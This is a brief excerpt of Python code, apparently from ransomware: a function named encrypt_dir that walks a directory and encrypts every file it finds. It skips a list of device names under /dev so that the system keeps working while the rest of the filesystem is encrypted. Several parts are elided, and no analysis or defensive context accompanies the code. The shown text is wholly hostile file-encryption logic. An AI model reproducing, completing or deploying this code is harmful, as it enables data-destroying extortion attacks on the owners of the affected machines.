...
def encrypt_dir(directory, key):
    ...
    if len(files) > 0:
        for file in files:
            ...
            try:
                if '/dev' in path[:4]:
                    if not any(substring in file for substring in ('dm-', 'sda', 'port', 'vcs', 'tty', 'initctl', 'stderr', 'stdin', 'stdout', 'sg', 'hidraw', 'psaux', 'ptmx', 'console', 'random', 'zero', 'mem', 'rfkill', 'dri', 'snd', 'disk', 'block', 'char')):
                        encrypt(path, key)
                else:
                    encrypt(path, key)
            except:
